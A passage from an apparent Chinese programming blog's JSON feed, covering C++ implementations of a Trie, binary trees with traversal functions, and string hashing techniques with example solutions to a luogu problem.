(location-&gt;next[word[i] - &#x27;a&#x27;] == nullptr)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            TrieNode* temp = new TrieNode();</span><br><span class=\"line\">            location-&gt;next[word[i] - &#x27;a&#x27;]=temp;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        location = location-&gt;next[word[i] - &#x27;a&#x27;];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    location-&gt;Isword = true;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">bool Trie::search(string word)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    TrieNode* location = root;</span><br><span class=\"line\">    //while (word&amp;&amp;location)//注意location不能为空</span><br><span class=\"line\">    for (int i = 0; i &lt; word.length()&amp;&amp;location;i++)</span><br><span class=\"line\">        location = location-&gt;next[word[i] - &#x27;a&#x27;];</span><br><span class=\"line\">    return(location != NULL &amp;&amp; location-&gt;Isword);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">void Trie::deleteTrie(TrieNode* root)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    for (int i = 0; i &lt; Num; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if (root-&gt;next[i] != NULL)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            deleteTrie(root-&gt;next[i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    delete root;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">void main()                     //简单测试  </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Trie tree;</span><br><span class=\"line\">    int n;                      //输入n个单词在字典树中</span><br><span class=\"line\">    cin &gt;&gt; n;</span><br><span class=\"line\">    while (n--)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        string s;</span><br><span class=\"line\">        cin &gt;&gt; s;</span><br><span class=\"line\">        tree.insert(s);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    string input;</span><br><span class=\"line\">    cout &lt;&lt; &quot;输入要检查的单词&quot; &lt;&lt; endl;</span><br><span class=\"line\">    cin &gt;&gt; input;</span><br><span class=\"line\">    cout &lt;&lt; boolalpha &lt;&lt; tree.search(input) &lt;&lt; endl;//查找是否存在是个单词</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/14/CPP%E6%A0%91/",
            "url": "https://mangpumo.github.io/2023/01/14/CPP%E6%A0%91/",
            "title": "CPP树",
            "date_published": "2023-01-13T19:27:09.000Z",
            "content_html": "<h1 id=\"树\"><a href=\"#树\" class=\"headerlink\" title=\"树\"></a>树</h1><h2 id=\"树的定义\"><a href=\"#树的定义\" class=\"headerlink\" title=\"树的定义\"></a>树的定义</h2><p>树是由一个集合以及在该集合上定义的一种关系构成的，集合中的元素称为树的结点，所定义的关系称为父子关系。父子关系在树的结点之间建立了一个层次结构，在这种层次结构中有一个结点具有特殊的地位，这个结点称为该树的根结点。</p>\n<p>数据结构中有很多树的结构，其中包括二叉树、二叉搜索树、2-3树、红黑树等等，本文着重介绍二叉树。</p>\n<h2 id=\"树的基本术语\"><a href=\"#树的基本术语\" class=\"headerlink\" title=\"树的基本术语\"></a>树的基本术语</h2><ul>\n<li>节点的度：一个节点含有的子树的个数称为该节点的度；</li>\n<li>叶节点或终端节点：度为0的节点称为叶节点；</li>\n<li>非终端节点或分支节点：度不为0的节点；</li>\n<li>双亲节点或父节点：若一个节点含有子节点，则这个节点称为其子节点的父节点；</li>\n<li>孩子节点或子节点：一个节点含有的子树的根节点称为该节点的子节点；</li>\n<li>兄弟节点：具有相同父节点的节点互称为兄弟节点；</li>\n<li>树的度：一棵树中，最大的节点的度称为树的度；</li>\n<li>节点的层次：从根开始定义起，根为第1层，根的子节点为第2层，以此类推；</li>\n<li>树的高度或深度：树中节点的最大层次；</li>\n<li>堂兄弟节点：双亲在同一层的节点互为堂兄弟；</li>\n<li>节点的祖先：从根到该节点所经分支上的所有节点；</li>\n<li>子孙：以某节点为根的子树中任一节点都称为该节点的子孙。</li>\n<li>森林：由m（m&gt;&#x3D;0）棵互不相交的树的集合称为森林；</li>\n</ul>\n<h2 id=\"树的存储结构\"><a href=\"#树的存储结构\" class=\"headerlink\" title=\"树的存储结构\"></a>树的存储结构</h2><h3 id=\"双亲表示法\"><a href=\"#双亲表示法\" class=\"headerlink\" title=\"双亲表示法\"></a>双亲表示法</h3><p><img data-src=\"https://img-blog.csdn.net/20180611151650623?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwNjExNjAx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n<h3 id=\"孩子表示法\"><a href=\"#孩子表示法\" class=\"headerlink\" title=\"孩子表示法\"></a>孩子表示法</h3><p><img data-src=\"https://img-blog.csdn.net/20180611151704448?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwNjExNjAx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n<h2 id=\"二叉树\"><a href=\"#二叉树\" class=\"headerlink\" title=\"二叉树\"></a>二叉树</h2><p>二叉树是数据结构中一种重要的数据结构，也是树表家族最为基础的结构。</p>\n<p>二叉树的定义：二叉树的每个结点至多只有二棵子树(不存在度大于2的结点)，二叉树的子树有左右之分，次序不能颠倒。</p>\n<h3 id=\"二叉树的性质\"><a href=\"#二叉树的性质\" class=\"headerlink\" title=\"二叉树的性质\"></a>二叉树的性质</h3><ul>\n<li>二叉树的第i ii层至多有2 i − 1 2^{i-1}2 ^i−1个结点；</li>\n<li>深度为k的二叉树至多有2^k−1个结点；</li>\n<li>对任何一棵二叉树T，如果其终端结点数为n0，度为2的结点数为,则n0&#x3D;n2+1</li>\n</ul>\n<h3 id=\"二叉树的实现\"><a href=\"#二叉树的实现\" class=\"headerlink\" title=\"二叉树的实现\"></a>二叉树的实现</h3><h4 id=\"结构\"><a href=\"#结构\" class=\"headerlink\" title=\"结构\"></a>结构</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">template &lt;class DataType&gt;</span><br><span class=\"line\">struct BiNode</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    DataType data;</span><br><span class=\"line\">    BiNode&lt;DataType&gt; * lchild,*rchild;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">template &lt;class DataType&gt;</span><br><span class=\"line\">class BiTree</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">    BiTree()&#123;root = Create(root);&#125;</span><br><span class=\"line\">    ~BiTree()&#123;Release(root);&#125;</span><br><span class=\"line\">    void PreOrder()&#123;PreOrder(root);&#125;\t//前序遍历</span><br><span class=\"line\">    void InOrder()&#123;InOrder(root);&#125;\t\t//中序遍历</span><br><span class=\"line\">    void PostOrder()&#123;PostOrder(root);&#125;\t//后序遍历</span><br><span class=\"line\">private:</span><br><span class=\"line\">    BiNode&lt;DataType&gt; * root;</span><br><span class=\"line\">    BiNode&lt;DataType&gt; * Create(BiNode&lt;DataType&gt; *bt);</span><br><span class=\"line\">    void Release(BiNode&lt;DataType&gt; *bt);</span><br><span class=\"line\">    void PreOrder(BiNode&lt;DataType&gt; *bt);</span><br><span class=\"line\">    void InOrder(BiNode&lt;DataType&gt; *bt);</span><br><span class=\"line\">    void PostOrder(BiNode&lt;DataType&gt; *bt);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"建立二叉树\"><a href=\"#建立二叉树\" class=\"headerlink\" title=\"建立二叉树\"></a>建立二叉树</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">template &lt;class DataType&gt;</span><br><span class=\"line\">BiNode&lt;DataType&gt; *BiTree&lt;DataType&gt;::Create(BiNode&lt;DataType&gt; *bt)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    DataType ch;</span><br><span class=\"line\">    cin&gt;&gt;ch;</span><br><span class=\"line\">    if(ch == &#x27;#&#x27;) bt = NULL;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        bt = new BiNode&lt;DataType&gt;;</span><br><span class=\"line\">        bt-&gt;data = ch;</span><br><span class=\"line\">        bt-&gt;lchild = Create(bt-&gt;lchild);</span><br><span class=\"line\">        bt-&gt;rchild = Create(bt-&gt;rchild);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return bt;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"释放二叉树\"><a href=\"#释放二叉树\" class=\"headerlink\" title=\"释放二叉树\"></a>释放二叉树</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">template &lt;class DataType&gt;</span><br><span class=\"line\">void BiTree&lt;DataType&gt;::Release(BiNode&lt;DataType&gt; *bt)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if(bt != NULL)&#123;</span><br><span class=\"line\">        Release(bt-&gt;lchild);</span><br><span class=\"line\">        Release(bt-&gt;rchild);</span><br><span class=\"line\">        delete bt;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"前序遍历\"><a href=\"#前序遍历\" class=\"headerlink\" title=\"前序遍历\"></a>前序遍历</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">template &lt;class DataType&gt;</span><br><span class=\"line\">void BiTree&lt;DataType&gt;::PreOrder(BiNode&lt;DataType&gt; *bt)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if(bt == NULL) return;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        cout&lt;&lt;bt-&gt;data;</span><br><span class=\"line\">        PreOrder(bt-&gt;lchild);</span><br><span class=\"line\">        PreOrder(bt-&gt;rchild);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"中序遍历\"><a href=\"#中序遍历\" class=\"headerlink\" title=\"中序遍历\"></a>中序遍历</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">template &lt;class DataType&gt;</span><br><span class=\"line\">void BiTree&lt;DataType&gt;::InOrder(BiNode&lt;DataType&gt; *bt)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if(bt == NULL) return;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        InOrder(bt-&gt;lchild);</span><br><span class=\"line\">        cout&lt;&lt;bt-&gt;data;</span><br><span class=\"line\">        InOrder(bt-&gt;rchild);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"后序遍历\"><a href=\"#后序遍历\" class=\"headerlink\" title=\"后序遍历\"></a>后序遍历</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">template &lt;class DataType&gt;</span><br><span class=\"line\">void BiTree&lt;DataType&gt;::PostOrder(BiNode&lt;DataType&gt; *bt)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if(bt == NULL) return;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        PostOrder(bt-&gt;lchild);</span><br><span class=\"line\">        PostOrder(bt-&gt;rchild);</span><br><span class=\"line\">        cout&lt;&lt;bt-&gt;data;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"满二叉树\"><a href=\"#满二叉树\" class=\"headerlink\" title=\"满二叉树\"></a>满二叉树</h3><p>一棵深度为k且有2^k-1个结点的二叉树称为满二叉树。</p>\n<p><img data-src=\"https://img-blog.csdn.net/20180611151745758?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwNjExNjAx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n<h4 id=\"满二叉树的性质：\"><a href=\"#满二叉树的性质：\" class=\"headerlink\" title=\"满二叉树的性质：\"></a>满二叉树的性质：</h4><ul>\n<li>一颗树深度为h最大层数为k深度与最大层数相同，k &#x3D; h ;</li>\n<li>叶子数为2h;</li>\n<li>第k层的结点数是2^k−1;</li>\n<li>总结点数是：2^k−1且总节点数一定是奇数。</li>\n</ul>\n<h3 id=\"完全二叉树\"><a href=\"#完全二叉树\" class=\"headerlink\" title=\"完全二叉树\"></a>完全二叉树</h3><p>深度为k的，有n个结点的二叉树，当且仅当其每一个结点都与深度为k的满二叉树中编号从1至n的结点一一对应时，称之为完全二叉树。</p>\n<p><img data-src=\"https://img-blog.csdn.net/20180611151734461?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwNjExNjAx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70\"></p>\n<p>完全二叉树是效率很高的数据结构，堆是一种完全二叉树或者近似完全二叉树，所以效率极高，像十分常用的排序算法、Dijkstra算法、Prim算法等都要用堆才能优化，二叉排序树的效率也要借助平衡性来提高，而平衡性基于完全二叉树。</p>\n<h3 id=\"二叉排序树\"><a href=\"#二叉排序树\" class=\"headerlink\" title=\"二叉排序树\"></a>二叉排序树</h3><p>二叉查找树定义：又称为是二叉排序树（Binary Sort Tree）或二叉搜索树。</p>\n<p>二叉排序树或者是一棵空树，或者是具有下列性质的二叉树：</p>\n<ul>\n<li>若它的左子树不空，则左子树上所有结点的值均小于它的根结点的值；</li>\n<li>若它的右子树不空，则右子树上所有结点的值均大于或等于它的根结点的值；</li>\n<li>它的左、右子树也分别为二叉排序树。</li>\n</ul>\n<h3 id=\"平衡二叉树\"><a href=\"#平衡二叉树\" class=\"headerlink\" title=\"平衡二叉树\"></a>平衡二叉树</h3><p>平衡二叉树（Balanced Binary Tree）又被称为AVL树。它或者是一棵空树，或者是具有下列性质的二叉树：它的左子树和右子树都是平衡二叉树，且左子树和右子树的深度之差的绝对值不超过1。（注：平衡二叉树应该是一棵二叉排序树）</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/14/CPP%E5%AD%97%E7%AC%A6%E4%B8%B2hash/",
            "url": "https://mangpumo.github.io/2023/01/14/CPP%E5%AD%97%E7%AC%A6%E4%B8%B2hash/",
            "title": "CPP字符串hash",
            "date_published": "2023-01-13T19:09:06.000Z",
            "content_html": "<h1 id=\"Hash\"><a href=\"#Hash\" class=\"headerlink\" title=\"Hash\"></a>Hash</h1><p>Hash就是一个像函数一样的东西，你放进去一个值，它给你输出来一个值。输出的值就是Hash值。一般Hash值会比原来的值更好储存(更小)或比较。</p>\n<p>那字符串Hash就非常好理解了。就是把字符串转换成一个整数的函数。而且要尽量做到使字符串对应唯一的Hash值。</p>\n<p>字符串Hash的种类还是有很多种的，不过在信息学竞赛中只会用到一种名为“BKDR Hash”的字符串Hash算法。</p>\n<p>它的主要思路是选取恰当的进制，可以把字符串中的字符看成一个大数字中的每一位数字，不过比较字符串和比较大数字的复杂度并没有什么区别(高精数的比较也是O(n)</p>\n<p>那么我们选择什么进制比较好？</p>\n<p>首先不要把任意字符对应到数字0，比如假如把a对应到数字0，那么将不能只从Hash结果上区分ab和b（虽然可以额外判断字符串长度，但不把任意字符对应到数字0更加省事且没有任何副作用），一般而言，把a-z对应到数字1-26比较合适。</p>\n<p>关于进制的选择实际上非常自由，大于所有字符对应的数字的最大值，不要含有模数的质因子(那还模什么)，比如一个字符集是a到z的题目，选择27、233、19260817都是可以的。</p>\n<p>模数的选择（尽量还是要选择质数）：</p>\n<p>绝大多数情况下，不要选择一个109</p>\n<p>最稳妥的办法是选择两个109如果能背过或在考场上找出一个1018偷懒的写法就是直接使用unsigned long long，不手动进行取模，它溢出时会自动对264</p>\n<h2 id=\"用luogu-P3370为例。\"><a href=\"#用luogu-P3370为例。\" class=\"headerlink\" title=\"用luogu P3370为例。\"></a>用luogu P3370为例。</h2><p>这是自然溢出hash(100)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;cstdio&gt;</span><br><span class=\"line\">#include &lt;cstring&gt;</span><br><span class=\"line\">#include &lt;algorithm&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">typedef unsigned long long ull;</span><br><span class=\"line\">ull base=131;</span><br><span class=\"line\">ull a[10010];</span><br><span class=\"line\">char s[10010];</span><br><span class=\"line\">int n,ans=1;</span><br><span class=\"line\">ull hashs(char s[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int len=strlen(s);</span><br><span class=\"line\">    ull ans=0;</span><br><span class=\"line\">    for (int i=0;i&lt;len;i++)</span><br><span class=\"line\">        ans=ans*base+(ull)s[i];</span><br><span class=\"line\">    return ans&amp;0x7fffffff;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    scanf(&quot;%d&quot;,&amp;n);</span><br><span class=\"line\">    for (int i=1;i&lt;=n;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        scanf(&quot;%s&quot;,s);</span><br><span class=\"line\">        a[i]=hashs(s);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sort(a+1,a+n+1);</span><br><span class=\"line\">    for (int i=2;i&lt;=n;i++)</span><br><span class=\"line\">        if (a[i]!=a[i-1])</span><br><span class=\"line\">            ans++;</span><br><span class=\"line\">    printf(&quot;%d\\n&quot;,ans);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这是单模数hash(80)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;cstdio&gt;</span><br><span class=\"line\">#include &lt;cstring&gt;</span><br><span class=\"line\">#include &lt;algorithm&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">typedef unsigned long long ull;</span><br><span class=\"line\">ull base=131;</span><br><span class=\"line\">ull a[10010];</span><br><span class=\"line\">char s[10010];</span><br><span class=\"line\">int n,ans=1;</span><br><span class=\"line\">ull mod=19260817;</span><br><span class=\"line\">ull hashs(char s[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int len=strlen(s);</span><br><span class=\"line\">    ull ans=0;</span><br><span class=\"line\">    for (int i=0;i&lt;len;i++)</span><br><span class=\"line\">        ans=(ans*base+(ull)s[i])%mod;</span><br><span class=\"line\">    return ans;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    scanf(&quot;%d&quot;,&amp;n);</span><br><span class=\"line\">    for (int i=1;i&lt;=n;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        scanf(&quot;%s&quot;,s);</span><br><span class=\"line\">        a[i]=hashs(s);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sort(a+1,a+n+1);</span><br><span class=\"line\">    for (int i=2;i&lt;=n;i++)</span><br><span class=\"line\">        if (a[i]!=a[i-1])</span><br><span class=\"line\">            ans++;</span><br><span class=\"line\">    printf(&quot;%d\\n&quot;,ans);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这是双hash(100)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;cstdio&gt;</span><br><span class=\"line\">#include &lt;cstring&gt;</span><br><span class=\"line\">#include &lt;algorithm&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">typedef unsigned long long ull;</span><br><span class=\"line\">ull base=131;</span><br><span class=\"line\">struct data</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ull x,y;</span><br><span class=\"line\">&#125;a[10010];</span><br><span class=\"line\">char s[10010];</span><br><span class=\"line\">int n,ans=1;</span><br><span class=\"line\">ull mod1=19260817;</span><br><span class=\"line\">ull mod2=19660813;</span><br><span class=\"line\">ull hash1(char s[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int len=strlen(s);</span><br><span class=\"line\">    ull ans=0;</span><br><span class=\"line\">    for (int i=0;i&lt;len;i++)</span><br><span class=\"line\">        ans=(ans*base+(ull)s[i])%mod1;</span><br><span class=\"line\">    return ans;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">ull hash2(char s[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int len=strlen(s);</span><br><span class=\"line\">    ull ans=0;</span><br><span class=\"line\">    for (int i=0;i&lt;len;i++)</span><br><span class=\"line\">        ans=(ans*base+(ull)s[i])%mod2;</span><br><span class=\"line\">    return ans;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">bool comp(data a,data b)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    return a.x&lt;b.x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    scanf(&quot;%d&quot;,&amp;n);</span><br><span class=\"line\">    for (int i=1;i&lt;=n;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        scanf(&quot;%s&quot;,s);</span><br><span class=\"line\">        a[i].x=hash1(s);</span><br><span class=\"line\">        a[i].y=hash2(s);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sort(a+1,a+n+1,comp);</span><br><span class=\"line\">    for (int i=2;i&lt;=n;i++)</span><br><span class=\"line\">        if (a[i].x!=a[i-1].x || a[i-1].y!=a[i].y)</span><br><span class=\"line\">            ans++;</span><br><span class=\"line\">    printf(&quot;%d\\n&quot;,ans);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这是只用一个10^18质数的hash(100)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;cstdio&gt;</span><br><span class=\"line\">#include &lt;cstring&gt;</span><br><span class=\"line\">#include &lt;algorithm&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">typedef unsigned long long ull;</span><br><span class=\"line\">ull base=131;</span><br><span class=\"line\">ull a[10010];</span><br><span class=\"line\">char s[10010];</span><br><span class=\"line\">int n,ans=1;</span><br><span class=\"line\">ull mod=212370440130137957ll;</span><br><span class=\"line\">ull hashs(char s[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int len=strlen(s);</span><br><span class=\"line\">    ull ans=0;</span><br><span class=\"line\">    for (int i=0;i&lt;len;i++)</span><br><span class=\"line\">        ans=(ans*base+(ull)s[i])%mod;</span><br><span class=\"line\">    return ans;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    scanf(&quot;%d&quot;,&amp;n);</span><br><span class=\"line\">    for (int i=1;i&lt;=n;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        scanf(&quot;%s&quot;,s);</span><br><span class=\"line\">        a[i]=hashs(s);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    sort(a+1,a+n+1);</span><br><span class=\"line\">    for (int i=2;i&lt;=n;i++)</span><br><span 